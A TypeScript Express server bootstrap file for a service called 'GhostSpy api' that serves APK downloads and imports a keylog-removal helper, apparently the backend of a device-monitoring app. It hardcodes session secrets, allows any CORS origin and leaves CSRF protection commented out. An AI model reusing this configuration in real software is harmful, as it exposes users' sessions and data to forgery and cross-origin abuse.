// Import necessary packages and modules
import express from "express";
import cors from "cors";
import cookieSession from "cookie-session";
import dotenv from "dotenv";
import bodyParser from "body-parser";
import passport from "passport";
import session from "express-session";
import path from "path";

// import cookieParser from "cookie-parser";
// import csrf from "csurf";

import { startSocketIO } from "./modules/socket/index";
import { startMongoDB } from "./modules/mongo";

import routes from "./routes";
import {
	Removekeylogs,
	addMaxDeviceLimitToExistingUsers,
	addAvailableResetPasswordUsers,
} from "./modules/share";

const http = require("http");
// protect of XSS atach
const helmet = require("helmet");

// CSruf security
// const cookieParser = require("cookie-parser");
// const csurf = require("csurf");

// Load environment variables from .env file
dotenv.config({
	path: process.env.NODE_ENV === "production" ? ".env" : ".env.dev",
});

// Create an instance of the Express app
const app = express();

//set secure HTTP headers
app.use(helmet());

// app.use(cookieParser());

// CSRF protection middleware
// const csrfProtection = csurf({ cookie: true });

// // Set up a route to send the CSRF token
// app.get("/api/v1/api/csrf-token", csrfProtection, (req: any, res: any) => {
// 	return res.json({ csrfToken: req.csrfToken() });
// });

// Configure the public holder (draft)
app.use(express.static("/public"));

// APK download URL
app.use("/downloads", express.static(path.join(__dirname, "public/downloads")));

// Extract API URL and version from environment variables
const { API_URL, API_VER, PORT } = process.env;

// Configure CORS options to only allow requests from the specified origin
const corsOptions = {
	//origin: API_URL,
	origin: "*",
	// credentials: true, // Allow credentials (cookies) to be sent
	allowedHeaders: ["Content-Type", "Authorization", "x-access-token"],
	optionsSuccessStatus: 200,
};
app.use(cors(corsOptions));

// Configure the Express application to use the body-parser middleware for parsing JSON data
app.use(bodyParser.json({ limit: "500mb" }));
// Configure the Express application to use the body-parser middleware for parsing URL-encoded data
app.use(bodyParser.urlencoded({ limit: "500mb", extended: true }));

// Configure cookie-based user sessions
app.use(
	cookieSession({
		name: "cookie-session",
		keys: ["key1", "key2"],
		secret: "COOKIE_SECRET", // should use as secret environment variable
		httpOnly: true,
	})
);

// Configure headers for requests and responses
app.use((req, res, next) => {
	res.setHeader("Access-Control-Allow-Origin", "*");
	res.setHeader(
		"Access-Control-Allow-Headers",
		"Origin, X-Requested-With, Content, Accept, Content-Type, Authorization"
	);
	res.setHeader(
		"Access-Control-Allow-Methods",
		"GET, POST, PUT, DELETE, PATCH, OPTIONS"
	);
	next();
});

// Avoid Information Leakage:
app.disable("x-powered-by");

// Remove Database
// Removekeylogs();
// addMaxDeviceLimitToExistingUsers();
// addAvailableResetPasswordUsers();

// Start the Socket.IO server
startSocketIO();

//Connect to MongoDB using Mongoose
startMongoDB();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(session({ secret: "secret", resave: true, saveUninitialized: true }));
app.use(passport.initialize());
app.use(passport.session());

// Import and configure routes
routes.initializRoutes(app);

// Start the server listening on the specified port number
app.listen(PORT, () => {
	console.log(
		`✨`,
		"\x1b[35m GhostSpy api \x1b[0m",
		`server is running on port 5000.`
	);
});
